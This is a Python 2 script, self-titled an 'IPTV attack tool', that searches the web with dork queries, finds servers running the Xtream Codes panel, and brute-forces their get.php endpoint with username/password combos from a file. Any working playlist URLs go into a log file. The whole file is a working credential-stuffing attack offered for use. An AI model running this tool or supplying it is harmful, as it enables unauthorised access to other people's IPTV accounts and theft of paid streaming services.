try:
    from requests import get
    from urlparse import urlparse
    from duckduckgo import search
    from sys import argv
except ImportError as e:
    print str(e) 

def banner():
    print """

$$$$$$\ $$$$$$$\ $$$$$$$$\ $$\    $$\                  $$\     $$\                         $$\               $$\                         $$\ 
\_$$  _|$$  __$$\\__$$  __|$$ |   $$ |                 $$ |    $$ |                        $$ |              $$ |                        $$ |
  $$ |  $$ |  $$ |  $$ |   $$ |   $$ |       $$$$$$\ $$$$$$\ $$$$$$\    $$$$$$\   $$$$$$$\ $$ |  $$\       $$$$$$\    $$$$$$\   $$$$$$\  $$ |
  $$ |  $$$$$$$  |  $$ |   \$$\  $$  |       \____$$\\_$$  _|\_$$  _|   \____$$\ $$  _____|$$ | $$  |      \_$$  _|  $$  __$$\ $$  __$$\ $$ |
  $$ |  $$  ____/   $$ |    \$$\$$  /        $$$$$$$ | $$ |    $$ |     $$$$$$$ |$$ /      $$$$$$  /         $$ |    $$ /  $$ |$$ /  $$ |$$ |
  $$ |  $$ |        $$ |     \$$$  /        $$  __$$ | $$ |$$\ $$ |$$\ $$  __$$ |$$ |      $$  _$$<          $$ |$$\ $$ |  $$ |$$ |  $$ |$$ |
$$$$$$\ $$ |        $$ |      \$  /         \$$$$$$$ | \$$$$  |\$$$$  |\$$$$$$$ |\$$$$$$$\ $$ | \$$\         \$$$$  |\$$$$$$  |\$$$$$$  |$$ |
\______|\__|        \__|       \_/           \_______|  \____/  \____/  \_______| \_______|\__|  \__|         \____/  \______/  \______/ \__|
                                                                                                                                             
                                                                                                                                             
                                                                                                                                             
$$\                        $$$$$$\             $$$$$$\   $$$$$$\                                  $$$$$$\       $$$$$$\                      
$$ |                      $$$ __$$\           $$$ __$$\ $$  __$$\                                $$$ __$$\     $$  __$$\                     
$$$$$$$\  $$\   $$\       $$$$\ $$ |$$\   $$\ $$$$\ $$ |$$ /  $$ |                    $$\    $$\ $$$$\ $$ |    \__/  $$ |                    
$$  __$$\ $$ |  $$ |      $$\$$\$$ |\$$\ $$  |$$\$$\$$ | $$$$$$  |      $$$$$$\       \$$\  $$  |$$\$$\$$ |     $$$$$$  |                    
$$ |  $$ |$$ |  $$ |      $$ \$$$$ | \$$$$  / $$ \$$$$ |$$  __$$<       \______|       \$$\$$  / $$ \$$$$ |    $$  ____/                     
$$ |  $$ |$$ |  $$ |      $$ |\$$$ | $$  $$<  $$ |\$$$ |$$ /  $$ |                      \$$$  /  $$ |\$$$ |    $$ |                          
$$$$$$$  |\$$$$$$$ |      \$$$$$$  /$$  /\$$\ \$$$$$$  /\$$$$$$  |                       \$  /   \$$$$$$  /$$\ $$$$$$$$\                     
\_______/  \____$$ |       \______/ \__/  \__| \______/  \______/                         \_/     \______/ \__|\________|                    
          $$\   $$ |                                                                                                                         
          \$$$$$$  |                                                                                                                         
           \______/                                                                                                                          

"""

def usage():
    banner()
    print "Usage:\n\tpython %s dorkFile.txt comboFile.txt\n" %(argv[0])

def extractUrls(dorks):
    temp = []
    urls = []
    for dork in open(dorks, 'r').readlines():
        for link in search(dork.strip(), max_results=400):
            if link not in temp:
                temp.append(link)
    return temp
	
def checkUrls(urls):
    temp = []
    for url in urls:
        url = urlparse(url.strip())[1]
        if url not in temp:
            temp.append(url)
    print "[i] Found %s in total." %(len(temp))
    return temp

def aliveOrNot(urls):
    temp = []
    print "[*] Hunting URLs for Admin panel"
    for url in urls:
        try:
            if "Xtream Codes</a>" in get("http://%s/" %(url), timeout=10).text:
                print "\tPanel found on URL  -->> http://%s/" %(url)
                temp.append(url)
        except Exception as e:
            #print "\tNo Panel found -->> http://%s/" %(url)
            pass
    print "[i] %s of them are alive!" %(len(temp))
    return temp
    
def bruteAccounts(urls,comboFile):
    for user in open(comboFile, 'r').readlines():
        print "[i] Trying combo: %s" %(user.strip())
        for url in urls:
            try:
                accountToTry = "http://%s/get.php?username=%s&password=%s&type=m3u&output=ts" %(url.strip(), user.strip(), user.strip())
                if "#EXTINF:0" in get(accountToTry, timeout=15, stream=True).text:
                    print "[+] Playlist URL found: %s" %(accountToTry)
                    f = open("logs.txt", "a")
                    f.write("%s\n" %(accountToTry))
                    f.close()
            except Exception as e:
                pass
        
if __name__ == '__main__':
    try:
        usage()
        dorks = argv[1]
        comboFile = argv[2]
        bruteAccounts(aliveOrNot(checkUrls(extractUrls(dorks))), comboFile)
    except Exception as e:
        print "Error\n%s" %(str(e))
        
	
